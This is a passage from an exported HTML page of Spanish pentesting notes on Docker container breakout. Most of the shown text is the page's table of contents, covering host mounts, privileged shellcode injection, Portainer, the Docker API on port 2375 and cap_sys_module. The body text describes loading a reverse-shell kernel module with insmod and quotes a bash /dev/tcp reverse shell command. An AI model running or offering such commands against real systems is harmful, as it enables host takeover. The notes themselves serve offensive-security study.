</code><button class="copy-code-button">Copy</button></pre></div><div><p>Ejecutamos el comando <code>make</code>, luego podríamos proceder a ponernos en escucha por el puerto aclarado en la máquina host (O donde querramos envíar la reverse shell).</p></div><div><p>Ejecutamos el comando <code>insmod reverse-shell.ko</code>, y al hacerlo se ejecutaría el comando ingresado, en este caso en las primeras líneas del archivo <strong>c</strong> se indicio `/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1'</p></div><div class="mod-footer"></div></div></div></div></div></div><div class="sidebar-right sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="graph-view-wrapper"><div class="sidebar-section-header">Interactive Graph</div><div class="graph-view-placeholder">
		<div class="graph-view-container">
			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Docker Breakout"><div class="tree-item-contents heading-link" heading-name="Docker Breakout"><span class="tree-item-title">Docker Breakout</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Uso_de_monturas_en_el_despliegue_de_contenedores_para_acceder_a_a_archivos_privilegiados_del_sistema_host._Un_atacante_puede_aprovecharse_de_las_monturas_para_manipular_los_archivos_del_host__comprometer_la_seguridad_del_sistema."><div class="tree-item-contents heading-link" heading-name="Uso de monturas en el despliegue de contenedores para acceder a a archivos privilegiados del sistema host. Un atacante puede aprovecharse de las monturas para manipular los archivos del host  comprometer la seguridad del sistema."><span class="tree-item-title">Uso de monturas en el despliegue de contenedores para acceder a a archivos privilegiados del sistema host. Un atacante puede aprovecharse de las monturas para manipular los archivos del host  comprometer la seguridad del sistema.</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Despliegue_de_contenedores_con_la_compartición_de_procesos_(**-pid=host**)_y_permisos_privilegiados_(**-privileged**)._Un_atacante_podría_inyectar_un_shellcode_malicioso_en_un_proceso_en_ejecución_como_root,_lo_que_podría_permitir_al_atacante_tomar_control_del_sistema_host."><div class="tree-item-contents heading-link" heading-name="Despliegue de contenedores con la compartición de procesos (**-pid=host**) y permisos privilegiados (**-privileged**). Un atacante podría inyectar un shellcode malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema host."><span class="tree-item-title">Despliegue de contenedores con la compartición de procesos (<strong>-pid=host</strong>) y permisos privilegiados (<strong>-privileged</strong>). Un atacante podría inyectar un shellcode malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema host.</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Uso_de_**Portainer**_para_administrar_el_despliegue_de_un_contenedor._Un_atacante_podría_ingresar_y_manipular_archivos_privilegiados_del_sistema_host_mediante_el_uso_de_monturas_para_así_escapar_del_contenedor."><div class="tree-item-contents heading-link" heading-name="Uso de **Portainer** para administrar el despliegue de un contenedor. Un atacante podría ingresar y manipular archivos privilegiados del sistema host mediante el uso de monturas para así escapar del contenedor."><span class="tree-item-title">Uso de <strong>Portainer</strong> para administrar el despliegue de un contenedor. Un atacante podría ingresar y manipular archivos privilegiados del sistema host mediante el uso de monturas para así escapar del contenedor.</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="3"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Abuso_de_la_**API**_de_**Docker**_por_el_puerto_**2375**_para_la_creación_de_imágenes,_despligue_de_contenedores_e_inyección_de_comandos_privilegiados_en_la_máquina_host._Un_atacnte_puede_explotar_esta_API_para_comprometer_la_seguridad_del_host_y_lograr_la_ejecución_de_comandos_con_privilegios_elevados."><div class="tree-item-contents heading-link" heading-name="Abuso de la **API** de **Docker** por el puerto **2375** para la creación de imágenes, despligue de contenedores e inyección de comandos privilegiados en la máquina host. Un atacnte puede explotar esta API para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados."><span class="tree-item-title">Abuso de la <strong>API</strong> de <strong>Docker</strong> por el puerto <strong>2375</strong> para la creación de imágenes, despligue de contenedores e inyección de comandos privilegiados en la máquina host. Un atacnte puede explotar esta API para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados.</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Escalada"><div class="tree-item-contents heading-link" heading-name="Escalada"><span class="tree-item-title">Escalada</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Demonio_de_docker_enlazado_con_el_contenedor_por_la_ruta_*/var/run/docker.sock*"><div class="tree-item-contents heading-link" heading-name="Demonio de docker enlazado con el contenedor por la ruta */var/run/docker.sock*"><span class="tree-item-title">Demonio de docker enlazado con el contenedor por la ruta <em>/var/run/docker.sock</em></span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item mod-collapsible" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Uso_de_--pid=host_y_--privileged_o_asignación_de_capabilities_especificas"><div class="tree-item-contents heading-link" heading-name="Uso de --pid=host y --privileged o asignación de capabilities especificas"><div class="collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><span class="tree-item-title">Uso de --pid=host y --privileged o asignación de capabilities especificas</span></div></a><div class="tree-item-children nav-folder-children"><div class="tree-item" data-depth="4"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Shellcode_=_Instrucción_a_bajo_nivel."><div class="tree-item-contents heading-link" heading-name="Shellcode = Instrucción a bajo nivel."><span class="tree-item-title">Shellcode = Instrucción a bajo nivel.</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Portainer"><div class="tree-item-contents heading-link" heading-name="Portainer"><span class="tree-item-title">Portainer</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="2"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Abusando_de_la_API_de_Docker"><div class="tree-item-contents heading-link" heading-name="Abusando de la API de Docker"><span class="tree-item-title">Abusando de la API de Docker</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Payloads:"><div class="tree-item-contents heading-link" heading-name="Payloads:"><span class="tree-item-title">Payloads:</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\3.-escalada-de-privilegios\docker-breakout.html#Cap_sys_module"><div class="tree-item-contents heading-link" heading-name="Cap sys_module"><span class="tree-item-title">Cap sys_module</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>